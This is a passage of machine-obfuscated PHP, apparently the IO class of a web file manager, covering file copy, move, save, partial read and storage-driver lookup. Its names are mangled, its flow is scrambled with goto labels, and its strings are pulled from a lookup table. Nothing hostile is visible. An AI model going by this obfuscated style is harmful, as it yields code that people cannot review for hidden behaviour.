$bÜ›‰—ƒ ¬ = addslashes($bÜ›‰—ƒ ¬); $bÜ›‰—ƒ ¬ = str_replace(array($cÇ•–ñ¹¹¬[1005], $cÇ•–ñ¹¹¬[227]), array($cÇ•–ñ¹¹¬[1006], $cÇ•–ñ¹¹¬[1007]), $bÜ›‰—ƒ ¬); $cİĞ…ÛÇĞ[] = str_replace($cÇ•–ñ¹¹¬[55], $cÇ•–ñ¹¹¬[1008], $bÜ›‰—ƒ ¬); } return $cÇ•–ñ¹¹¬[55] . implode($cÇ•–ñ¹¹¬[1009], $cİĞ…ÛÇĞ) . $cÇ•–ñ¹¹¬[55]; } private function sqlDecode($eĞÛìÂ£ñĞ, $B‘ë¾Ãõ«ã) { $C¡‘ˆ‡¢ÏÖ =& $_SERVER[ç]; $eĞÛìÂ£ñĞ = str_replace(array($C¡‘ˆ‡¢ÏÖ[1006], $C¡‘ˆ‡¢ÏÖ[1007]), array($C¡‘ˆ‡¢ÏÖ[1005], $C¡‘ˆ‡¢ÏÖ[227]), $eĞÛìÂ£ñĞ); if ($B‘ë¾Ãõ«ã == $C¡‘ˆ‡¢ÏÖ[9]) { $eĞÛìÂ£ñĞ = stripslashes($eĞÛìÂ£ñĞ); } return $eĞÛìÂ£ñĞ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($DŠÙ¾ªã¿ƒ, $bÕù‹÷°îÔ) { goto Cš´ÎØò‰Æ; DòÁáöã¥¶: Hook::trigger($D­‹‚ ‚ô[1011] . $DŠÙ¾ªã¿ƒ . $D­‹‚ ‚ô[1014], $Céäœ¥æš², $E›È†); return $E›È†; goto a™ê˜ç•ß‰; eµ…«¶ˆçˆ: Hook::trigger($D­‹‚ ‚ô[1011] . $DŠÙ¾ªã¿ƒ . $D­‹‚ ‚ô[1012], $Céäœ¥æš²); $a„ì¤ï•È = self::driverMake($bÕù‹÷°îÔ[0]); if (method_exists($a„ì¤ï•È, $DŠÙ¾ªã¿ƒ)) { $E›È† = @call_user_func_array(array($a„ì¤ï•È, $DŠÙ¾ªã¿ƒ), $bÕù‹÷°îÔ); } else { if (method_exists($a„ì¤ï•È, $D­‹‚ ‚ô[1013])) { $E›È† = @call_user_func_array(array($a„ì¤ï•È, $DŠÙ¾ªã¿ƒ), $bÕù‹÷°îÔ); } else { if (method_exists(self, $DŠÙ¾ªã¿ƒ)) { $E›È† = @call_user_func_array(array(self, $DŠÙ¾ªã¿ƒ), $bÕù‹÷°îÔ); } else { $E›È† = call_user_func_array(array(parent, $DŠÙ¾ªã¿ƒ), $bÕù‹÷°îÔ); } } } goto DòÁáöã¥¶; Cš´ÎØò‰Æ: $D­‹‚ ‚ô =& $_SERVER[ç]; $Céäœ¥æš² = $bÕù‹÷°îÔ; $GLOBALS[$D­‹‚ ‚ô[1010]] = $D­‹‚ ‚ô[1011] . $DŠÙ¾ªã¿ƒ; goto eµ…«¶ˆçˆ; a™ê˜ç•ß‰: } public static function init($e¥àÄ£¨Ä) { return self::driverMake($e¥àÄ£¨Ä); } public static function copy($BÀÏ¢«İªÂ, $eïÕà„¥÷, $D†ØÜáÛ = false, $bà¤¹óÒÄË = false) { return self::copyMoveStart($BÀÏ¢«İªÂ, $eïÕà„¥÷, $D†ØÜáÛ, $_SERVER[ç][513], $bà¤¹óÒÄË); } public static function move($d‚®£Ç¶¶Í, $BæºÒİÖ¾, $aÌå¿ï×æ¦ = false, $däê˜­¦Ê¡ = false) { return self::copyMoveStart($d‚®£Ç¶¶Í, $BæºÒİÖ¾, $aÌå¿ï×æ¦, $_SERVER[ç][515], $däê˜­¦Ê¡); } private static function copyMoveStart($E”ŒãºËÙø, $eÉç«øš…«, $dàõ¿³Æ™À, $aÃ»‡ô¢Œ™, $E¨¨äì”«) { $cù±„·‡‘‰ =& $_SERVER[ç]; $eÆÃó§†Ä· = array($E”ŒãºËÙø, $eÉç«øš…«, $dàõ¿³Æ™À, $E¨¨äì”«); Hook::trigger($cù±„·‡‘‰[1011] . $aÃ»‡ô¢Œ™ . $cù±„·‡‘‰[1012], $eÆÃó§†Ä·); $E…îÁÄŸøÁ = self::copyMove($E”ŒãºËÙø, $eÉç«øš…«, $dàõ¿³Æ™À, $aÃ»‡ô¢Œ™, $E¨¨äì”«); Hook::trigger($cù±„·‡‘‰[1011] . $aÃ»‡ô¢Œ™ . $cù±„·‡‘‰[1014], $eÆÃó§†Ä·, $E…îÁÄŸøÁ); return $E…îÁÄŸøÁ; } public static function saveFile($b„ß¼¸ë, $D™ñ„÷çµŞ, $Fœ­œéé–ã = true) { goto f´ÒèÕ«—ƒ; fØ¦ĞÀæ£»: $eÌ¡™ÙƒùÆ = self::copyFile($bã¡é³˜ñÖ, $b„ß¼¸ë, $f÷×•àØ¸µ, $C§ô¦Î‚Û‹, $b¹Ê Ö±[$aöêß‹ˆ´É[28]], $DÌÇ’ÏÚĞÓ); if ($aÀ™Ñ›³‰—) { $eÌ¡™ÙƒùÆ = $aÀ™Ñ›³‰—->getPathOuter($eÌ¡™ÙƒùÆ); } return $eÌ¡™ÙƒùÆ; goto EÖÖçÁÁŸ; Aá«£òôçğ: $C§ô¦Î‚Û‹ = $f÷×•àØ¸µ->pathFather($D™ñ„÷çµŞ); $DÌÇ’ÏÚĞÓ = !0; if (!$Fœ­œéé–ã && self::driverIsSame($bã¡é³˜ñÖ, $f÷×•àØ¸µ)) { $DÌÇ’ÏÚĞÓ = !1; } goto fØ¦ĞÀæ£»; f´ÒèÕ«—ƒ: $aöêß‹ˆ´É =& $_SERVER[ç]; $b¹Ê Ö± = self::info($D™ñ„÷çµŞ); $bã¡é³˜ñÖ = self::driverMake($b„ß¼¸ë); goto Aæ†„¼ôø; Aæ†„¼ôø: $f÷×•àØ¸µ = self::driverMake($D™ñ„÷çµŞ); $aÀ™Ñ›³‰— = !1; if ($f÷×•àØ¸µ->pathParse[$aöêß‹ˆ´É[1015]]) { $b¢Œ‘Ìó¶ = $f÷×•àØ¸µ->pathParse[$aöêß‹ˆ´É[1015]]; $aÀ™Ñ›³‰— = $f÷×•àØ¸µ; $f÷×•àØ¸µ = self::driverMake($b¢Œ‘Ìó¶); } goto Aá«£òôçğ; EÖÖçÁÁŸ: } private static function copyMove($bÙó‹¿äÙ, $C§‘·É­ùÌ, $CÈ†êç•ÃÇ, $Fêİ¡ÒÔ©ƒ, $aÇƒù¹Ş®„ = false) { goto e¶ŒÙ¬Ğë; dÙÔ‚ö÷‡: Hook::trigger($A…ÊİéÖ¼“[72], $f½Ù¨ÓÉõ, $bÙó‹¿äÙ, $Eƒ›ÉÖ¥¯‹, $C§‘·É­ùÌ); $eÚÔ³Ò« = self::driverIsSame($f½Ù¨ÓÉõ, $Eƒ›ÉÖ¥¯‹); if ($eÚÔ³Ò«) { if ($Fêİ¡ÒÔ©ƒ == $A…ÊİéÖ¼“[515] && !method_exists($Eƒ›ÉÖ¥¯‹, $A…ÊİéÖ¼“[1016]) && trim($C§‘·É­ùÌ, $A…ÊİéÖ¼“[8]) == trim($Eƒ›ÉÖ¥¯‹->pathFather($bÙó‹¿äÙ), $A…ÊİéÖ¼“[8])) { if ($f½Ù¨ÓÉõ->pathThis($bÙó‹¿äÙ) != $aÇƒù¹Ş®„ && !$f½Ù¨ÓÉõ->isTypeObject()) { return $f½Ù¨ÓÉõ->rename($bÙó‹¿äÙ, $aÇƒù¹Ş®„); } return $Eƒ›ÉÖ¥¯‹->getPathOuter($bÙó‹¿äÙ); } if (method_exists($Eƒ›ÉÖ¥¯‹, $Fêİ¡ÒÔ©ƒ)) { return $Eƒ›ÉÖ¥¯‹->{$Fêİ¡ÒÔ©ƒ}($bÙó‹¿äÙ, $C§‘·É­ùÌ, $CÈ†êç•ÃÇ); } } goto C²Ì’ÅÆÖß; C²Ì’ÅÆÖß: $DñÓ™‘‘‡§ = $f½Ù¨ÓÉõ->isFile($bÙó‹¿äÙ); if (!$DñÓ™‘‘‡§ && $Eƒ›ÉÖ¥¯‹->getType() == $A…ÊİéÖ¼“[700] && $f½Ù¨ÓÉõ->getType() == $A…ÊİéÖ¼“[105]) { $bŠ„¤‰‹ = $Eƒ›ÉÖ¥¯‹->copyFolderFromIO($f½Ù¨ÓÉõ, $bÙó‹¿äÙ, $C§‘·É­ùÌ, $CÈ†êç•ÃÇ, $fÚ´óÏÀÔ, $aÇƒù¹Ş®„); } else { $bŠ„¤‰‹ = self::copyPath($f½Ù¨ÓÉõ, $bÙó‹¿äÙ, $Eƒ›ÉÖ¥¯‹, $C§‘·É­ùÌ, $CÈ†êç•ÃÇ, $fÚ´óÏÀÔ, $DñÓ™‘‘‡§, $aÇƒù¹Ş®„); } if ($bŠ„¤‰‹ && $fÚ´óÏÀÔ) { $f½Ù¨ÓÉõ->remove($bÙó‹¿äÙ); } goto bŠ¥áÖ¨¸; e¶ŒÙ¬Ğë: $A…ÊİéÖ¼“ =& $_SERVER[ç]; if (!$bÙó‹¿äÙ || $bÙó‹¿äÙ == $A…ÊİéÖ¼“[8] || !$C§‘·É­ùÌ) { return !1; } ignore_timeout(); goto cÈ´”ÀŒÍ­; bŠ¥áÖ¨¸: if ($fÖÇ†èÓ–È) { $bŠ„¤‰‹ = $fÖÇ†èÓ–È->getPathOuter($bŠ„¤‰‹); } return $bŠ„¤‰‹; goto Bªñ‰Á…; cÈ´”ÀŒÍ­: $f½Ù¨ÓÉõ = self::driverMake($bÙó‹¿äÙ); $Eƒ›ÉÖ¥¯‹ = self::driverMake($C§‘·É­ùÌ); $fÚ´óÏÀÔ = $Fêİ¡ÒÔ©ƒ == $A…ÊİéÖ¼“[515]; goto a“£Ì†å¯ƒ; a“£Ì†å¯ƒ: $fÖÇ†èÓ–È = !1; if ($Eƒ›ÉÖ¥¯‹->pathParse[$A…ÊİéÖ¼“[1015]]) { $C§‘·É­ùÌ = $Eƒ›ÉÖ¥¯‹->pathParse[$A…ÊİéÖ¼“[1015]]; $fÖÇ†èÓ–È = $Eƒ›ÉÖ¥¯‹; $Eƒ›ÉÖ¥¯‹ = self::driverMake($C§‘·É­ùÌ); } self::check($f½Ù¨ÓÉõ, $bÙó‹¿äÙ, $Eƒ›ÉÖ¥¯‹, $C§‘·É­ùÌ); goto dÙÔ‚ö÷‡; Bªñ‰Á…: } private static function check($bó›³îª¶©, $E©£×Â²’, $e·âöîîÛ­, &$eİÙ¶¯°Êë) { $B½’Ï—Ìõ =& $_SERVER[ç]; if (self::driverIsSame($bó›³îª¶©, $e·âöîîÛ­) && $bó›³îª¶©->isFolder($E©£×Â²’) && $bó›³îª¶©->isParentOf($E©£×Â²’, $eİÙ¶¯°Êë)) { show_json(LNG($B½’Ï—Ìõ[1017]), !1); } if (!$bó›³îª¶©->exist($E©£×Â²’)) { show_json(LNG($B½’Ï—Ìõ[104]), !1); } } private static function copyPath($Eãƒ²¾á¹, $BÖ¹àìî®í, $f¥…ƒ‰Ã½, $b‹‰Ë¢ºãÌ, $cŒ¥ªŠÕ°Œ, $cÍ¾›àÛ¨, $AáŠõÅ®õÆ, $C£°ÃïÛÕ = false) { goto Dï™›±±Ê; fË¤°¢ä­: if ($AáŠõÅ®õÆ) { return self::copyFile($Eãƒ²¾á¹, $BÖ¹àìî®í, $f¥…ƒ‰Ã½, $b‹‰Ë¢ºãÌ, $a±ÜÌ®æô, $cÍ¾›àÛ¨); } if ($cŒ¥ªŠÕ°Œ == REPEAT_RENAME_FOLDER) { $cŒ¥ªŠÕ°Œ = !1; } $d¨¢¥Ú—‘Ï = rtrim($b‹‰Ë¢ºãÌ, $b¦½ÏÛÎ¹Œ[8]) . $b¦½ÏÛÎ¹Œ[8] . $a±ÜÌ®æô; goto F¼ƒ‰´®Š…; F¼ƒ‰´®Š…: $E”ë¤‚˜ôÊ = $f¥…ƒ‰Ã½->mkdir($f¥…ƒ‰Ã½->getPath($d¨¢¥Ú—‘Ï)); $b‹‰Ë¢ºãÌ = $f¥…ƒ‰Ã½->getPathInner($E”ë¤‚˜ôÊ); $fÇø¼ß„Íğ = $Eãƒ²¾á¹->listPath($BÖ¹àìî®í, !0); goto açÛÄíĞİˆ; Dï™›±±Ê: $b¦½ÏÛÎ¹Œ =& $_SERVER[ç]; $a±ÜÌ®æô = $C£°ÃïÛÕ ? $C£°ÃïÛÕ : $Eãƒ²¾á¹->pathThis($BÖ¹àìî®í); if ($cŒ¥ªŠÕ°Œ) { $bí¦Í¹Ö²™ = $f¥…ƒ‰Ã½->fileNameExist($b‹‰Ë¢ºãÌ, $a±ÜÌ®æô); $a±ÜÌ®æô = $f¥…ƒ‰Ã½->fileNameAuto($b‹‰Ë¢ºãÌ, $a±ÜÌ®æô, $cŒ¥ªŠÕ°Œ, !$AáŠõÅ®õÆ); $cŒ¥ªŠÕ°Œ = $bí¦Í¹Ö²™ ? $cŒ¥ªŠÕ°Œ : !1; } goto fË¤°¢ä­; açÛÄíĞİˆ: $f“»ÓŒ³êİ = array_merge($fÇø¼ß„Íğ[$b¦½ÏÛÎ¹Œ[73]], $fÇø¼ß„Íğ[$b¦½ÏÛÎ¹Œ[74]]); foreach ($f“»ÓŒ³êİ as $BîÎîßÜ…) { $aŒƒ¨ÕõÅà = $BîÎîßÜ…[$b¦½ÏÛÎ¹Œ[29]] == $b¦½ÏÛÎ¹Œ[173]; $BÖ¹àìî®í = $Eãƒ²¾á¹->getPathInner($BîÎîßÜ…[$b¦½ÏÛÎ¹Œ[75]]); $A•¢ÍñŠ¡” = self::copyPath($Eãƒ²¾á¹, $BÖ¹àìî®í, $f¥…ƒ‰Ã½, $b‹‰Ë¢ºãÌ, $cŒ¥ªŠÕ°Œ, $cÍ¾›àÛ¨, $aŒƒ¨ÕõÅà); if (!$A•¢ÍñŠ¡”) { IO::errorTips($b¦½ÏÛÎ¹Œ[1018] . $BÖ¹àìî®í . $b¦½ÏÛÎ¹Œ[66] . $b‹‰Ë¢ºãÌ); } } return $E”ë¤‚˜ôÊ; goto dÃŞØ¢®Ì; dÃŞØ¢®Ì: } private static function copyFile($A²ÖØƒ¾Á‡, $E‹”ĞÖÅ‘ª, $a½¾‡†Ï¼, $fİÎÃãª™Â, $AõÁ¿®ÄŠê, $Dˆ§ÀĞ»³È) { goto Dö´éâÇ“¿; a®¼…Ÿ¢†Ü: Hook::trigger($c‘ÆÇê¦¹Í[1020], $A²ÖØƒ¾Á‡, $E‹”ĞÖÅ‘ª, $a½¾‡†Ï¼, $fİÎÃãª™Â, $AõÁ¿®ÄŠê, $eñÁÃ†ŸÈ); if (self::driverIsSame($A²ÖØƒ¾Á‡, $a½¾‡†Ï¼)) { if ($Dˆ§ÀĞ»³È) { $fË¡Ó®Ñ­ = $a½¾‡†Ï¼->moveFile($E‹”ĞÖÅ‘ª, $fİÎÃãª™Â); } else { $fË¡Ó®Ñ­ = $a½¾‡†Ï¼->copyFile($E‹”ĞÖÅ‘ª, $fİÎÃãª™Â); } Hook::trigger($c‘ÆÇê¦¹Í[1021], $A²ÖØƒ¾Á‡, $E‹”ĞÖÅ‘ª, $a½¾‡†Ï¼, $fİÎÃãª™Â, $AõÁ¿®ÄŠê, $fË¡Ó®Ñ­); return $fË¡Ó®Ñ­; } $F¸ª·’šÖß = TEMP_FILES; goto c¦‹ñ²¡»Š; e”Á¿¶Ç…¬: $D‘§ÂÈ²Ë = $A²ÖØƒ¾Á‡->iconvApp($D‘§ÂÈ²Ë); $fË¡Ó®Ñ­ = $a½¾‡†Ï¼->upload($fİÎÃãª™Â, $D‘§ÂÈ²Ë, $Dˆ§ÀĞ»³È); self::remove($F¸ª·’šÖß . $eñÁÃ†ŸÈ); goto e”¢â‡ÖßÚ; e”¢â‡ÖßÚ: Hook::trigger($c‘ÆÇê¦¹Í[1021], $A²ÖØƒ¾Á‡, $E‹”ĞÖÅ‘ª, $a½¾‡†Ï¼, $fİÎÃãª™Â, $AõÁ¿®ÄŠê, $fË¡Ó®Ñ­); return $fË¡Ó®Ñ­; goto eĞ¬‚‡Ò…ß; Dö´éâÇ“¿: $c‘ÆÇê¦¹Í =& $_SERVER[ç]; $fİÎÃãª™Â = $a½¾‡†Ï¼->getPath(rtrim($fİÎÃãª™Â, $c‘ÆÇê¦¹Í[8]) . $c‘ÆÇê¦¹Í[8] . $AõÁ¿®ÄŠê); $eñÁÃ†ŸÈ = $c‘ÆÇê¦¹Í[1019] . time() . rand_string(5); goto a®¼…Ÿ¢†Ü; c¦‹ñ²¡»Š: mk_dir($F¸ª·’šÖß); $D‘§ÂÈ²Ë = $F¸ª·’šÖß . $eñÁÃ†ŸÈ; $D‘§ÂÈ²Ë = $A²ÖØƒ¾Á‡->download($E‹”ĞÖÅ‘ª, $D‘§ÂÈ²Ë); goto e”Á¿¶Ç…¬; eĞ¬‚‡Ò…ß: } public static function pathFather($f²ñ¬…¹¦) { $DÃÁ¦µÉæ‘ = IO::init($f²ñ¬…¹¦); $bÇÒƒ®ğ™À = $DÃÁ¦µÉæ‘->pathFather($DÃÁ¦µÉæ‘->path); return $DÃÁ¦µÉæ‘->getPathOuter($bÇÒƒ®ğ™À); } public static function fileOut($aÍ’¬ÂªÊ, $a™ìîÉ¶Àƒ = false, $DŒŒî­Ìã = false, $dâŒ‹àÉÛ = '') { $FÉ—¢é¸‰ = self::driverMake($aÍ’¬ÂªÊ); if ($FÉ—¢é¸‰->isFileOutServer()) { return $FÉ—¢é¸‰->fileOutServer($aÍ’¬ÂªÊ, $a™ìîÉ¶Àƒ, $DŒŒî­Ìã, $dâŒ‹àÉÛ); } return $FÉ—¢é¸‰->fileOut($aÍ’¬ÂªÊ, $a™ìîÉ¶Àƒ, $DŒŒî­Ìã, $dâŒ‹àÉÛ); } public static function fileOutImage($D±ŠˆÒ†³, $d¸½–µ½‚· = 250) { $Bòùƒà¯‰ = array(250, 600, 1200, 3000, 5000); for ($D¦…©Çôº‹ = 0; $D¦…©Çôº‹ < count($Bòùƒà¯‰); $D¦…©Çôº‹++) { if ($D¦…©Çôº‹ == 0 && $d¸½–µ½‚· <= $Bòùƒà¯‰[$D¦…©Çôº‹]) { $d¸½–µ½‚· = $Bòùƒà¯‰[$D¦…©Çôº‹]; break; } else { if ($d¸½–µ½‚· > $Bòùƒà¯‰[$D¦…©Çôº‹ - 1] && $d¸½–µ½‚· <= $Bòùƒà¯‰[$D¦…©Çôº‹]) { $d¸½–µ½‚· = $Bòùƒà¯‰[$D¦…©Çôº‹]; break; } else { if ($D¦…©Çôº‹ == count($Bòùƒà¯‰) - 1 && $d¸½–µ½‚· > $Bòùƒà¯‰[$D¦…©Çôº‹]) { $d¸½–µ½‚· = $Bòùƒà¯‰[$D¦…©Çôº‹]; break; } } } } $FçÁèì×« = self::driverMake($D±ŠˆÒ†³); if ($FçÁèì×«->isFileOutServer()) { return $FçÁèì×«->fileOutImageServer($D±ŠˆÒ†³, $d¸½–µ½‚·); } return $FçÁèì×«->fileOutImage($D±ŠˆÒ†³, $d¸½–µ½‚·); } private static function driverIsSame($DÆ’ŠèéÔ, $aîˆÈğ·œ) { goto fÈ»è¹£Ù; C‹ƒÓ¢ø¢ì: if ($DÆ’ŠèéÔ->pathDriver == $aîˆÈğ·œ->pathDriver) { return !0; } return !1; goto føÄ…é×œ; fÈ»è¹£Ù: $B¢Êóœ”çç =& $_SERVER[ç]; $Eë¡ÍàÇ— = $DÆ’ŠèéÔ->getType(); $CéÅ«¹„Ù‹ = $aîˆÈğ·œ->getType(); goto côÃ»ˆ­õ; côÃ»ˆ­õ: if ($Eë¡ÍàÇ— != $CéÅ«¹„Ù‹) { return !1; } if ($Eë¡ÍàÇ— == $B¢Êóœ”çç[700]) { return !0; } if ($Eë¡ÍàÇ— == $B¢Êóœ”çç[105]) { return !0; } goto C‹ƒÓ¢ø¢ì; føÄ…é×œ: } public static function copyUpdate($a‚™ŠíÙ¬ö, $c‚†Ó˜¬î„) { goto b¾Àª–²ª„; B™İ×¾Ë¹í: Hook::trigger($f´…‡±ŸÓİ[1025], $a‚™ŠíÙ¬ö, $c‚†Ó˜¬î„, $C°áš‡Ë); foreach ($D›Ç¦í¯ˆ· as $dÕĞİ‘ƒòî) { IO::mkdir($dÕĞİ‘ƒòî); } foreach ($c¹âì–ƒ as $dÕĞİ‘ƒòî) { IO::copy($dÕĞİ‘ƒòî[$f´…‡±ŸÓİ[1022]], $dÕĞİ‘ƒòî[$f´…‡±ŸÓİ[1023]], REPEAT_REPLACE); } goto bÁÁÇ•·Ğ«; a•Äáôß¾ë: $B§Ç¦Ôö­ = self::_listAll($a‚™ŠíÙ¬ö); $F‹ñø¯İù… = self::_listAll($c‚†Ó˜¬î„); $c¹âì–ƒ = array(); goto CÊ¤¸äŒ½Œ; CÊ¤¸äŒ½Œ: $D›Ç¦í¯ˆ· = array(); foreach ($B§Ç¦Ôö­ as $e…¨ö˜ => $dÕĞİ‘ƒòî) { if (isset($F‹ñø¯İù…[$e…¨ö˜])) { if ($dÕĞİ‘ƒòî[$f´…‡±ŸÓİ[76]] == 1) { continue; } if ($F‹ñø¯İù…[$e…¨ö˜][$f´…‡±ŸÓİ[77]] == $dÕĞİ‘ƒòî[$f´…‡±ŸÓİ[77]]) { continue; } } if ($dÕĞİ‘ƒòî[$f´…‡±ŸÓİ[76]] == 1) { $D›Ç¦í¯ˆ·[] = $c‚†Ó˜¬î„ . $f´…‡±ŸÓİ[8] . $e…¨ö˜; continue; } $AÅÁâóàÄó = strstr(trim($e…¨ö˜, $f´…‡±ŸÓİ[8]), $f´…‡±ŸÓİ[8]) ? get_path_father($e…¨ö˜) : $f´…‡±ŸÓİ[33]; $c¹âì–ƒ[] = array($f´…‡±ŸÓİ[1022] => $dÕĞİ‘ƒòî[$f´…‡±ŸÓİ[75]], $f´…‡±ŸÓİ[1023] => rtrim($c‚†Ó˜¬î„, $f´…‡±ŸÓİ[8]) . $f´…‡±ŸÓİ[8] . $AÅÁâóàÄó, $f´…‡±ŸÓİ[1024] => $dÕĞİ‘ƒòî); } $C°áš‡Ë = array($f´…‡±ŸÓİ[173] => $c¹âì–ƒ, $f´…‡±ŸÓİ[76] => $D›Ç¦í¯ˆ·); goto B™İ×¾Ë¹í; b¾Àª–²ª„: $f´…‡±ŸÓİ =& $_SERVER[ç]; if (!IO::exist($a‚™ŠíÙ¬ö)) { return !1; } if (!IO::exist($c‚†Ó˜¬î„)) { IO::mkdir($c‚†Ó˜¬î„); } goto a•Äáôß¾ë; bÁÁÇ•·Ğ«: } private static function _listAll($cé½Éà÷Éå) { $a¿Æá¹ñÖ =& $_SERVER[ç]; $cé½Éà÷Éå = KodIO::clear($cé½Éà÷Éå); $Bµ•°Ò©Áá = IO::listAll($cé½Éà÷Éå); foreach ($Bµ•°Ò©Áá as &$dÙ šÁ¸‹) { $bËôÑ—¦º¤ = substr($dÙ šÁ¸‹[$a¿Æá¹ñÖ[75]], strlen($cé½Éà÷Éå)); $dÙ šÁ¸‹[$a¿Æá¹ñÖ[1026]] = trim($bËôÑ—¦º¤, $a¿Æá¹ñÖ[8]); } unset($dÙ šÁ¸‹); return array_to_keyvalue($Bµ•°Ò©Áá, $a¿Æá¹ñÖ[1026]); } public static function fileSubstr($A àŸäÙêÔ, $eÀ¦‹Úˆ†À, $d´×Ï‰†˜ = false) { goto d…µÛì¤÷·; eò¨Ğ›ºÆ: if ($d´×Ï‰†˜ === !1) { $d´×Ï‰†˜ = $cİñ´»”…É - $eÀ¦‹Úˆ†À; } if ($eÀ¦‹Úˆ†À + $d´×Ï‰†˜ > $cİñ´»”…É) { $d´×Ï‰†˜ = $cİñ´»”…É - $eÀ¦‹Úˆ†À; } if (!$cİñ´»”…É && $b¸™Ä·Í®->getType() == $E‘‡©‡ËŠ¿[105] && !$b¸™Ä·Í®->exist($A àŸäÙêÔ)) { throw new Exception($E‘‡©‡ËŠ¿[1027] . LNG($E‘‡©‡ËŠ¿[1028]) . $E‘‡©‡ËŠ¿[892] . get_path_this($A àŸäÙêÔ) . $E‘‡©‡ËŠ¿[33]); } goto EÀ·ÛÓŞ; fŠ‚»×†˜Ô: $fá˜†’ç„ = $eÀ¦‹Úˆ†À; $aéãäÂçë = $d´×Ï‰†˜; if ($eÀ¦‹Úˆ†À < 0) { $eÀ¦‹Úˆ†À = $cİñ´»”…É + $eÀ¦‹Úˆ†À; } goto eò¨Ğ›ºÆ; bÔ‘Éù‰¸£: if (!$fĞ¨ÔÉËÓì && $d´×Ï‰†˜ && isset($GLOBALS[$E‘‡©‡ËŠ¿[1029]])) { throw new Exception($GLOBALS[$E‘‡©‡ËŠ¿[1029]][$E‘‡©‡ËŠ¿[1030]]); } return $fĞ¨ÔÉËÓì; goto F—…ëêÑ…ô; d…µÛì¤÷·: $E‘‡©‡ËŠ¿ =& $_SERVER[ç]; $b¸™Ä·Í® = self::driverMake($A àŸäÙêÔ); $cİñ´»”…É = $b¸™Ä·Í®->size($A àŸäÙêÔ); goto fŠ‚»×†˜Ô; EÀ·ÛÓŞ: if ($d´×Ï‰†˜ <= 0) { return $E‘‡©‡ËŠ¿[33]; } if ($eÀ¦‹Úˆ†À < 0 || $eÀ¦‹Úˆ†À >= $cİñ´»”…É || $d´×Ï‰†˜ > 1024 * 1024 * 5) { throw new Exception("\146\151\x6c\x65\122\x65\141\144\x20\145\x72\162\157\162\41\40\163\x74\141\x72\164\x3d{$eÀ¦‹Úˆ†À}\x3b\x6c\x65\156\147\x74\150\75{$d´×Ï‰†˜}\73\40\x73\x69\x7a\145\x3d{$cİñ´»”…É}\73"); } $fĞ¨ÔÉËÓì = $b¸™Ä·Í®->fileSubstr($A àŸäÙêÔ, $eÀ¦‹Úˆ†À, $d´×Ï‰†˜); goto bÔ‘Éù‰¸£; F—…ëêÑ…ô: } private static function driverMake(&$bÍãˆâ–†Ù) { goto d®Õ¤Á¼Œ¶; Bë±ÕÕ¯¡²: return $aŸåñÊå; goto D†ó¬¦Í…ø; DÓ˜•ÏÒ‰§: if ($a¦Ç¨‰¦˜à[$CÎÕŠ°‰í[29]] == KodIO::KOD_IO && !self::$driverListSystem[$a¦Ç¨‰¦˜à[$CÎÕŠ°‰í[388]]]) { return !1; } $bÍãˆâ–†Ù = $a¦Ç¨‰¦˜à[$CÎÕŠ°‰í[1031]]; $aŸåñÊå = self::driverGet($a¦Ç¨‰¦˜à, $bÍãˆâ–†Ù); goto Bë±ÕÕ¯¡²; d®Õ¤Á¼Œ¶: $CÎÕŠ°‰í =& $_SERVER[ç]; $a¦Ç¨‰¦˜à = KodIO::parse($bÍãˆâ–†Ù); if (!self::$driverListSystem) { $a©·²†èÈ­ = Model($CÎÕŠ°‰í[709])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($a©·²†èÈ­, $CÎÕŠ°‰í[388]); } goto DÓ˜•ÏÒ‰§; D†ó¬¦Í…ø: } private static function driverGet($BÒñÆ¾ã¿, &$CÆ¨ùÜßŞš) { goto D˜ÁÙ­»Ÿ; bèÌ™Üå©¤: if (isset($c—åÅ±å[$C£ Â¥ëÆœ[6]][$C£ Â¥ëÆœ[1043]])) { $AÊ¶¤¸èŠ–->pathBase = rtrim($c—åÅ±å[$C£ Â¥ëÆœ[6]][$C£ Â¥ëÆœ[1043]], $C£ Â¥ëÆœ[8]) . $C£ Â¥ëÆœ[8]; $CÆ¨ùÜßŞš = $AÊ¶¤¸èŠ–->pathBase . ltrim($CÆ¨ùÜßŞš, $C£ Â¥ëÆœ[8]); } $CÆ¨ùÜßŞš = $AÊ¶¤¸èŠ–->getPath($CÆ¨ùÜßŞš); if (isset($BÒñÆ¾ã¿[$C£ Â¥ëÆœ[1015]])) { $CÆ¨ùÜßŞš = $BÒñÆ¾ã¿[$C£ Â¥ëÆœ[1015]]; } goto b³°ÊÒŒö¾; D˜ÁÙ­»Ÿ: $C£ Â¥ëÆœ =& $_SERVER[ç]; $f†ÉÛÒ´Š = $BÒñÆ¾ã¿[$C£ Â¥ëÆœ[1032]]; $E¥ºŞØî Õ = $BÒñÆ¾ã¿[$C£ Â¥ëÆœ[388]]; goto Eªì«›¿°; b³°ÊÒŒö¾: $AÊ¶¤¸èŠ–->path = $CÆ¨ùÜßŞš; return $AÊ¶¤¸èŠ–; goto eì²·„Š±ä; AÌí¥åø£: $AÊ¶¤¸èŠ– = self::$driverCache[$bøƒñòÁ•]; $AÊ¶¤¸èŠ–->pathDriver = $f†ÉÛÒ´Š; $AÊ¶¤¸èŠ–->pathBase = $C£ Â¥ëÆœ[33]; goto bèÌ™Üå©¤; Eªì«›¿°: switch ($BÒñÆ¾ã¿[$C£ Â¥ëÆœ[29]]) { case KodIO::KOD_IO: $c—åÅ±å = self::$driverListSystem[$E¥ºŞØî Õ]; break; case KodIO::KOD_SOURCE: $CÆ¨ùÜßŞš = $E¥ºŞØî Õ . $CÆ¨ùÜßŞš; $c—åÅ±å = array($C£ Â¥ëÆœ[1033] => $C£ Â¥ëÆœ[1034], $C£ Â¥ëÆœ[6] => $BÒñÆ¾ã¿); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $dŸŠğÉ„ = $GLOBALS[$C£ Â¥ëÆœ[1035]]; self::$driverListUser = array_to_keyvalue($dŸŠğÉ„, $C£ Â¥ëÆœ[388]); } $c—åÅ±å = self::$driverListUser[$E¥ºŞØî Õ]; break; case KodIO::KOD_SHARE_LINK: $c—åÅ±å = array($C£ Â¥ëÆœ[1033] => $C£ Â¥ëÆœ[1036], $C£ Â¥ëÆœ[6] => $BÒñÆ¾ã¿); $BÆãÏ„ˆ›› = Action($C£ Â¥ëÆœ[1037])->sharePathInfo($BÒñÆ¾ã¿[$C£ Â¥ëÆœ[75]]); $CÆ¨ùÜßŞš = $BÆãÏ„ˆ››[$C£ Â¥ëÆœ[390]]; if 